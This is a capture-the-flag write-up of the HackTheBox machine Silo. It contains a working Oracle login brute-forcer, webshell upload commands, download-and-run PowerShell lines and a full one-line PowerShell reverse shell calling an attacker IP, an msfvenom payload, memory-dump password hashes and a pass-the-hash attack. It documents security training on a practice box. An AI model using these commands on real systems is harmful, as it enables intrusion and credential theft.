---
title: HTB: Silo
url: https://0xdf.gitlab.io/2018/08/04/htb-silo.html
date: 2018-08-04T14:00:08+00:00
difficulty: Medium [30]
os: Windows
tags: htb-silo, hackthebox, ctf, oracle, odat, sqlplus, nishang, aspx, webshell, volatility, passthehash, rottenpotato, potato, oscp-like-v1
---

Silo was the first time I’ve had the opportunity to play around with exploiting a Oracle database. After the struggle of getting the tools installed and learning the ins and outs of using them, we can take advantage of this database to upload a webshell to the box. Then with the webshell, we can get a powershell shell access as a low-priv user. To privesc, we’ll have to break out our memory forensics skillset to get a hash out of a memory dump, which then we can pass back in a pass the hash attack to get a system shell. That’s all if we decided not to take the shortcut and just use the Oracle database (running as system) to read both flag files.

## Box Info

| Name | [Silo](https://hackthebox.com/machines/silo)  [Silo](https://hackthebox.com/machines/silo) [Play on HackTheBox](https://hackthebox.com/machines/silo) |
| --- | --- |
| Release Date | 17 Mar 2018 |
| Retire Date | 04 May 2024 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Silo |
| Radar Graph | Radar chart for Silo |
| First Blood User | 13:44:27[alamot alamot](https://app.hackthebox.com/users/179) |
| First Blood Root | 13:28:52[alamot alamot](https://app.hackthebox.com/users/179) |
| Creator | [egre55 egre55](https://app.hackthebox.com/users/1190) |

## nmap

Start out with nmap, all tcp and standard scripts:

```

root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.82
Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-21 21:56 EDT
Nmap scan report for 10.10.10.82
Host is up (0.098s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1521/tcp  open  oracle
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown
49162/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 24.21 seconds

root@kali# nmap -sC -sV -oA nmap/initial 10.10.10.82
Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-21 21:56 EDT
Nmap scan report for 10.10.10.82
Host is up (0.12s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn?
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)                                                                                 49161/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submi
t.cgi?new-service :
SF-Port139-TCP:V=7.70%I=7%D=4/21%Time=5ADBEBEB%P=x86_64-pc-linux-gnu%r(Get
SF:Request,5,"\x83\0\0\x01\x8f");
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2018-04-21 21:58:51
|_  start_date: 2018-04-21 15:47:47

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.53 seconds

```

## Web - Port 80

### Site

We’ll start with the website listening on 80. The site is the default IIS page:
![](https://0xdfimages.gitlab.io/img/silo-web80-root.png)

### gobuster

Given nothing on the main site, we’ll start a gobuster. Unfortunately, it finds nothing:

```

root@kali# gobuster -u http://10.10.10.82/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html -t 30

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.82/
[+] Threads      : 30
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .txt,.html
=====================================================
=====================================================

```

## Oracle db - Port 1521

Having found nothing actionable on the web port, let’s see what we can find on the Oracle database.

### Set up

To interact with Oracle from our Kali box, there are three tools that can come in handy. `sqlplus` is required for `odat` to work properly:
- `sqlplus`
  - from [this github](https://github.com/bumpx/oracle-instantclient), download three files:
    - basic, sdk, and sqlplus
  - unzip them all into a Directory
  - update bashrc:

    ```

    alias sqlplus='/opt/oracle/instantclient_12_2/sqlplus'
    export PATH=/root/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/didier:/usr/local/go/bin’
    export SQLPATH=/opt/oracle/instantclient_12_2
    export TNS_ADMIN=/opt/oracle/instantclient_12_2
    export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2
    export ORACLE_HOME=/opt/oracle/instantclient_12_2

    ```
- Oracle Database Attacking Tool (ODAT)
  - download release from github: https://github.com/quentinhardy/odat/releases/
  - unzip in `/opt`
  - added line to `~/.bashrc`: `alias odat='export LD_LIBRARY_PATH=/opt/odat-libc2.5-i686/; cd /opt/odat-libc2.5-i686/; ./odat-libc2.5-i686; cd -'`
  - There are detailed instructions on the github readme.
- metasploit
  - use this walkthrough: https://blog.zsec.uk/msforacle/

### Attack Methodology:

[This Blackhat presentation](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf) is a good walkthrough of the steps necessary to exploit an Oracle db.

#### 1 - Identify database

Already done in nmap.

#### 2 - Identify SIDs

We really only need one valid SID, which we can get with `odat` or `metasploit`.

##### odat

Using `odat`, found two SIDs with `sidguesser`:

```

root@kali:/opt/odat-libc2.5-i686# odat sidguesser -s 10.10.10.82

[1] (10.10.10.82:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server
[+] 'XE' is a valid SID. Continue...
[+] 'XEXDB' is a valid SID. Continue...
100% |#####################################################################################################################################################| Time: 00:03:49
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521)
100% |#####################################################################################################################################################| Time: 00:00:09
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521)
[+] 'XE' is a valid SID. Continue...
100% |#####################################################################################################################################################| Time: 00:03:20
[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB

```

##### metasploit

metasploit found a couple different SIDs:

```

msf auxiliary(admin/oracle/sid_brute) > run

[*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt...
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'XE'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'PLSExtProc'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'CLRExtProc'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID ''
[*] 10.10.10.82:1521 - Done with brute force...
[*] Auxiliary module execution completed

```

So at this point we have four potential SIDs: ‘XE’, ‘XEXDB’, ‘PLSExtProc’, and ‘CLRExtProc’.

#### 3 - Guess / bruteforce user and pass

This was more challenging. I tried the odat and metasploit modules, but didn’t get any hits. What I didn’t know at the time was that that’s because the odat password list is in all caps.

So I wrote a brute force script in python, using threads, can go pretty quick:

```

#!/usr/bin/env python

import cx_Oracle
import sys
from multiprocessing import Pool

MAX_PROC = 50
host = "10.10.10.82"
sid = "XE"

def usage():
    print("{} [ip] [wordlist]".format(sys.argv[0]))
    print("  wordlist should be of the format [username]:[password]")
    sys.exit(1)

def scan(userpass):
    u, p = userpass.split(':')[:2]
    try:
        conn = cx_Oracle.connect('{user}/{pass_}@{ip}/{sid}'.format(user=u, pass_=p, ip=host, sid=sid))
        return u, p, True
    except cx_Oracle.DatabaseError:
        return u, p, False

def main(host, userpassfile, nprocs=MAX_PROC):
    with open(userpassfile, 'r') as f:
       userpass = f.read().rstrip().replace('\r','').split('\n')

    pool = Pool(processes=nprocs)

    for username, pass_, status in pool.imap_unordered(scan, [up for up in userpass]):
        if status:
            print("Found {} / {}\n\n".format(username, pass_))
        else:
            sys.stdout.write("\r {}/{}                               ".format(username, pass_))

if __name__ == '__main__':
    if len(sys.argv) != 3:
        usage()
    main(sys.argv[1], sys.argv[2])

```

Eventually, I decided to try different cases, so I wrote a couple scripts to modify existing lists to include upper, lower, and capitalized.

When fed that list, the scanner gives a good username / password: `SCOTT`:`tiger`.

#### 4 - Check out the database

At this point, we can connect using sqlplus:

```

root@kali# sqlplus SCOTT/tiger@10.10.10.82:1521/XE

SQL*Plus: Release 12.2.0.1.0 Production on Thu Apr 26 08:54:27 2018

Copyright (c) 1982, 2016, Oracle.  All rights reserved.

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>

```

Obviously the first thing we’ll do it check out the database. There isn’t any data of interest.

#### 5 - db PrivEsc

Looking at the current access, SCOTT doesn’t have privilege:

```

SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO

```

However, if we reconned with the `as sysdba` option (think sudo for Oracle), then we have a ton more:

```

root@kali# sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
...snip...
SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
SYS                            EXP_FULL_DATABASE              YES YES NO
SYS                            GATHER_SYSTEM_STATISTICS       YES YES NO
SYS                            HS_ADMIN_EXECUTE_ROLE          YES YES NO
SYS                            HS_ADMIN_ROLE                  YES YES NO
SYS                            HS_ADMIN_SELECT_ROLE           YES YES NO
SYS                            IMP_FULL_DATABASE              YES YES NO
SYS                            LOGSTDBY_ADMINISTRATOR         YES YES NO
SYS                            OEM_ADVISOR                    YES YES NO
SYS                            OEM_MONITOR                    YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            PLUSTRACE                      YES YES NO
SYS                            RECOVERY_CATALOG_OWNER         YES YES NO
SYS                            RESOURCE                       YES YES NO
SYS                            SCHEDULER_ADMIN                YES YES NO
SYS                            SELECT_CATALOG_ROLE            YES YES NO
SYS                            XDBADMIN                       YES YES NO
SYS                            XDB_SET_INVOKER                YES YES NO
SYS                            XDB_WEBSERVICES                YES YES NO
SYS                            XDB_WEBSERVICES_OVER_HTTP      YES YES NO
SYS                            XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO

32 rows selected.

```

Similarly with `odat`, running the `all` scan shows nothing that can be done, but passing in the `--sysdba` flag changes all of that:

```

root@kali# odat all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba

[1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] The target is vulnerable to a remote TNS poisoning

[2] (10.10.10.82:1521): Testing all modules on the XE SID with the SCOTT/tiger account
[2.1] UTL_HTTP library ?
[+] OK
[2.2] HTTPURITYPE library ?
[+] OK
[2.3] UTL_FILE library ?
[+] OK
[2.4] JAVA library ?
[-] KO
[2.5] DBMSADVISOR library ?
[+] OK
[2.6] DBMSSCHEDULER library ?
[-] KO
[2.7] CTXSYS library ?
[+] OK
[2.8] Hashed Oracle passwords ?
[+] OK
[2.9] Hashed Oracle passwords from history?
[+] OK
[2.10] DBMS_XSLPROCESSOR library ?
[+] OK
[2.11] External table to read files ?
[-] KO
[2.12] External table to execute system commands ?
[-] KO
[2.13] Oradbg ?
[-] KO
[2.14] DBMS_LOB to read files ?
[+] OK
[2.15] SMB authentication capture ?
[+] Perhaps (try with --capture to be sure)
[2.16] Gain elevated access (privilege escalation)?
[2.16.1] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?
[+] OK
[2.16.2] Modification of users' passwords using CREATE ANY PROCEDURE privilege only?
[-] KO
[2.16.3] DBA role using CREATE ANY TRIGGER privilege?
[-] KO
[2.16.4] DBA role using ANALYZE ANY (and CREATE PROCEDURE) privileges?
[-] KO
[2.16.5] DBA role using CREATE ANY INDEX (and CREATE PROCEDURE) privileges?
[-] KO
[2.17] Modify any table while/when he can select it only normally (CVE-2014-4237)?
[+] Impossible to know
[2.18] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?
Exception in thread Thread-1:
Traceback (most recent call last):
  File "threading.py", line 808, in __bootstrap_inner
  File "threading.py", line 761, in run
  File "CVE_2012_3137.py", line 105, in __sniff_sessionkey_and_salt__
  File "site-packages/scapy/sendrecv.py", line 570, in sniff
  File "site-packages/scapy/arch/linux.py", line 470, in __init__
  File "site-packages/scapy/arch/linux.py", line 139, in attach_filter
  File "socket.py", line 224, in meth
error: [Errno 22] Invalid argument

[-] KO

[3] (10.10.10.82:1521): Oracle users have not the password identical to the username ?
The login XS$NULL has already been tested at least once. What do you want to do:                               | ETA:  00:00:00
- stop (s/S)
- continue and ask every time (a/A)
- continue without to ask (c/C)
c
100% |#########################################################################################################| Time: 00:00:42
[-] No found a valid account on 10.10.10.82:1521/XE

```

In looking through what we can do, there’s a great diagram on the [odat GitHub page](https://github.com/quentinhardy/odat) that shows how each plugin tested for above maps to capabilities on the box:

![odat](https://0xdfimages.gitlab.io/img/ODAT_main_features_v2.0.jpg)

Based on the output, it seems that don’t have the ability to run commands (which ends up not being true, see section at the end), but we can upload and download files.

## Webshell

There was a webserver listening on 80, with the default iis page. Since we can upload, let’s upload a webshell:
- First, let’s verift that we can write to the webroot (and that it is in the default location):

  ```

  root@kali# odat dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot 0xdf.txt <(echo 0xdf was here)

  [1] (10.10.10.82:1521): Put the /dev/fd/63 local file in the C:\inetpub\wwwroot path (named 0xdf.txt) of the 10.10.10.82 server
  [+] The /dev/fd/63 local file was put in the remote C:\inetpub\wwwroot path (named 0xdf.txt)
  root@kali# curl http://10.10.10.82/0xdf.txt
  0xdf was here

  ```
- Nice. What kind of shell uploads will work:
  - php shell uploads, but then gets a 404 on request
  - asp does the same
  - aspx…

  ```

  root@kali# odat dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot 0xdf.aspx /usr/share/webshells/aspx/cmdasp.aspx
    
  [1] (10.10.10.82:1521): Put the /usr/share/webshells/aspx/cmdasp.aspx local file in the C:\inetpub\wwwroot path (named 0xdf.aspx) of the 10.10.10.82 server
  [+] The /usr/share/webshells/aspx/cmdasp.aspx local file was put in the remote C:\inetpub\wwwroot path (named 0xdf.aspx)

  ```

  ![](https://0xdfimages.gitlab.io/img/silo-webshell-whoami.png)

## User Shell

Now with a functioning webshell, let’s get a real shell:

Grab a copy of nishang’s poweshell reverse shell and add the line to call it at the bottom of the file:

```

root@kali# cp /opt/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1 .
root@kali# tail -1 Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.48 -Port 8084

```

Use SimpleHTTPServer to offer it, and then issue the following to the webshell:
`powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/Invoke-PowerShellTcp.ps1')`

Get a shell:

```

root@kali# nc -lnvp 8084
listening on [any] 8084 ...
connect to [10.10.15.48] from (UNKNOWN) [10.10.10.82] 49168
Windows PowerShell running as user SILO$ on SILO
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>

```

### user.txt

With shell, user.txt comes easy:

```

PS C:\windows\system32\inetsrv> dir \users\Phineas\Desktop

    Directory: C:\users\Phineas\Desktop

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---          1/5/2018  10:56 PM        300 Oracle issue.txt
-a---          1/4/2018   9:41 PM         32 user.txt

PS C:\windows\system32\inetsrv> type \users\Phineas\Desktop\user.txt
92ede778...

```

## Privesc

### Desktop Note

Along side the user flag on the desktop, there’s another file:

```

PS C:\windows\system32\inetsrv>type "\users\Phineas\Desktop\Oracle issue.txt"
Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0

link password:
?%Hm8646uC$

```

That password fails at dropbox, but requesting the note in the webshell shows why:

```

Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0

link password:
£%Hm8646uC$

```

That first ? was actually a £.

### Memdump

The Dropbox link returns a memory dump, so we get to break out volatility. First, we’ll need a profile.

From the shell, get an os:

```

PS C:\windows\system32\inetsrv>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600

```

Run `kdbgscan` and the first result is a 2012 profile:

```

root@kali# volatility kdbgscan -f SILO-20180105-221806.dmp
**************************************************
Instantiating KDBG using: Unnamed AS Win2012R2x64_18340 (6.3.9601 64bit)
Offset (V)                    : 0xf80078520a30
Offset (P)                    : 0x2320a30
KdCopyDataBlock (V)           : 0xf8007845f9b0
Block encoded                 : Yes
Wait never                    : 0xd08e8400bd4a143a
Wait always                   : 0x17a949efd11db80
KDBG owner tag check          : True
Profile suggestion (KDBGHeader): Win2012R2x64_18340
Version64                     : 0xf80078520d90 (Major: 15, Minor: 9600)
Service Pack (CmNtCSDVersion) : 0
Build string (NtBuildLab)     : 9600.16384.amd64fre.winblue_rtm.
PsActiveProcessHead           : 0xfffff80078537700 (51 processes)
PsLoadedModuleList            : 0xfffff800785519b0 (148 modules)
KernelBase                    : 0xfffff8007828a000 (Matches MZ: True)
Major (OptionalHeader)        : 6
Minor (OptionalHeader)        : 3
KPCR                          : 0xfffff8007857b000 (CPU 0)
KPCR                          : 0xffffd000207e8000 (CPU 1)
**************************************************
...

```

That profile works with other commands, so it seems to fit. After some playing around, the Win2012R2x64 actually fits better, so we’ll work with that.

Volatility has a [long list of plugins](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference) we can use.

After a bunch of enumeration, found hashes in the memory dump. First we’ll need to get offsets for the registry hives in memory, and then we can use the `hashdump` plugin:

```

root@kali# volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist
Volatility Foundation Volatility Framework 2.6
Virtual            Physical           Name
------------------ ------------------ ----
0xffffc0000100a000 0x000000000d40e000 \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat
0xffffc000011fb000 0x0000000034570000 \SystemRoot\System32\config\DRIVERS
0xffffc00001600000 0x000000003327b000 \??\C:\Windows\AppCompat\Programs\Amcache.hve
0xffffc0000001e000 0x0000000000b65000 [no name]
0xffffc00000028000 0x0000000000a70000 \REGISTRY\MACHINE\SYSTEM
0xffffc00000052000 0x000000001a25b000 \REGISTRY\MACHINE\HARDWARE
0xffffc000004de000 0x0000000024cf8000 \Device\HarddiskVolume1\Boot\BCD
0xffffc00000103000 0x000000003205d000 \SystemRoot\System32\Config\SOFTWARE
0xffffc00002c43000 0x0000000028ecb000 \SystemRoot\System32\Config\DEFAULT
0xffffc000061a3000 0x0000000027532000 \SystemRoot\System32\Config\SECURITY
0xffffc00000619000 0x0000000026cc5000 \SystemRoot\System32\Config\SAM
0xffffc0000060d000 0x0000000026c93000 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xffffc000006cf000 0x000000002688f000 \SystemRoot\System32\Config\BBI
0xffffc000007e7000 0x00000000259a8000 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xffffc00000fed000 0x000000000d67f000 \??\C:\Users\Administrator\ntuser.dat

root@kali# volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::

```

## root Shell

We could try to crack these, but first, let’s try pass the hash:

```

root@kali# /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82
 administrator@10.10.10.82
Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies

[*] Requesting shares on 10.10.10.82.....
[*] Found writable share ADMIN$
[*] Uploading file XryxqKFr.exe
[*] Opening SVCManager on 10.10.10.82.....
[*] Creating service PAYb on 10.10.10.82.....
[*] Starting service PAYb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

### root.txt

With that shell, flag is easy to grab:

```

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 78D4-EA4D

 Directory of C:\Users\Administrator\Desktop

01/07/2018  02:34 PM    <DIR>          .
01/07/2018  02:34 PM    <DIR>          ..
01/04/2018  12:38 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,284,826,112 bytes free

C:\Users\Administrator\Desktop>type root.txt
cd39ea0a

```

## Alternative Path to root

### Oracle Execution

The alternative path to root is to go directly through the Oracle database, since it is running as SYSTEM. If we cheat and check out a `tasklist` with our shell, we can see that (as well as that IIS isn’t running as SYSTEM):

```

PS C:\Windows\system32> tasklist /v

Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title
========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================
System Idle Process              0 Services                   0          4 K Unknown         NT AUTHORITY\SYSTEM                                   202:51:56 N/A
System                           4 Services                   0        276 K Unknown         NT AUTHORITY\SYSTEM                                     0:23:07 N/A
...snip...
oracle.exe                    1136 Services                   0    638,440 K Unknown         NT AUTHORITY\SYSTEM                                     1:37:10 N/A
OraClrAgnt.exe                1264 Services                   0      2,484 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
TNSLSNR.EXE                   1280 Services                   0     20,760 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:10 N/A
...snip...
w3wp.exe                      1688 Services                   0     31,192 K Unknown         IIS APPPOOL\DefaultAppPool                              0:00:00 N/A
...snip...

```

#### Grab root.txt

Once we have `odat` running, instead of writing a webshell, just grab root.txt:

```

root@kali# odat ctxsys -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --getFile c:\\users\\administrator\\desktop\\root.txt

[1] (10.10.10.82:1521): Read the c:\users\administrator\desktop\root.txt file on the 10.10.10.82 server
[+] Data stored in the c:\users\administrator\desktop\root.txt file (escape char replace by '\n'):
CD39EA0A...

```

#### Shell

Still, we wouldn’t know the user directory at this point, so we should use Oracle to get a shell.

While `odat` had indicated that we couldn’t execute files, in fact, we can, with the `externaltable` method. However, if we look at the help, it can only run an executable, no options allowed. So we’ll use `msfvenom` to make an exe:

```

root@kali# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=8084 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe

```

Now upload it:

```

root@kali# odat utlfile -s 10.10.10.82 -U SCOTT -P tiger -d XE --sysdba --putFile \\temp shell.exe shell.exe

[1] (10.10.10.82:1521): Put the shell.exe local file in the \temp folder like shell.exe on the 10.10.10.82 server
[+] The shell.exe file was created on the \temp directory on the 10.10.10.82 server like the shell.exe file

```

And run it:

```

root@kali# odat externaltable -s 10.10.10.82 -U SCOTT -P tiger -d XE --sysdba --exec \\temp shell.exe

[1] (10.10.10.82:1521): Execute the shell.exe command stored in the \temp path

```

This gives us a callback, which is a system shell:

```

msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.14:8084
[*] Sending stage (206403 bytes) to 10.10.10.82
[*] Meterpreter session 1 opened (10.10.14.14:8084 -> 10.10.10.82:49168) at 2018-08-03 07:22:00 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

### RottenPotato Privesc

If we check `whoami /priv`, we’ll see SeImpersonatePrivilege:

```

PS C:\windows\system32\inetsrv>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

This means that we can likely use RottenPotato (or LonelyPotato).

First, we’ll upload two files to the server. `MSFRottenPotato.exe` and `rev.bat`. The exe is from [Decoder’s GitHub page](https://github.com/decoder-it) for [lonelypotato](https://github.com/decoder-it/lonelypotato). The second is a simple powershell command to get a shell:

```

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.14',8085); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}; $client.Close()"

```

So, from our low priv shell, grab the files:

```

PS C:\temp> (new-object net.webclient).downloadfile('http://10.10.14.14:8083/rev.bat', 'C:\temp\rev.bat')
PS C:\temp> (new-object net.webclient).downloadfile('http://10.10.14.14:8083/MSFRottenPotato.exe', 'C:\temp\lp.exe')

```

Now, with a listener going, run it:

```

PS C:\temp> c:\temp\lp.exe * \temp\rev.bat
connect sock
CreateIlok: 0 0
start RPC  connection
CreateDoc: 0 0
COM -> bytes received: 116
RPC -> bytes Sent: 116
RPC -> bytes received: 84
COM -> bytes sent: 84
COM -> bytes received: 24
RPC -> bytes Sent: 24
RPC -> bytes received: 132
COM -> bytes sent: 132
COM -> bytes received: 127
RPC -> bytes Sent: 127
RPC -> bytes received: 196
COM -> bytes sent: 196
COM -> bytes received: 243
RPC -> bytes Sent: 243
RPC -> bytes received: 192
COM -> bytes sent: 192
COM -> bytes received: 72
RPC -> bytes Sent: 72
RPC -> bytes received: 60
COM -> bytes sent: 60
COM -> bytes received: 42
RPC -> bytes Sent: 42
RPC -> bytes received: 56
COM -> bytes sent: 56
CoGet: -2147022986 0
[+] authresult != -1
[+] Elevated Token tye:2
[+] DuplicateTokenEx :1  0
[+] Duped Token type:1
[+] Running \temp\rev.bat sessionId 1
[+] CreateProcessWithTokenW OK
Auth result: 0
Return code: 0
Last error: 0

```

And we catch a callback for a SYSTEM shell:

```

root@kali# nc -lnvp 8085
listening on [any] 8085 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.82] 49181

PS C:\Windows\system32> whoami
nt authority\system

```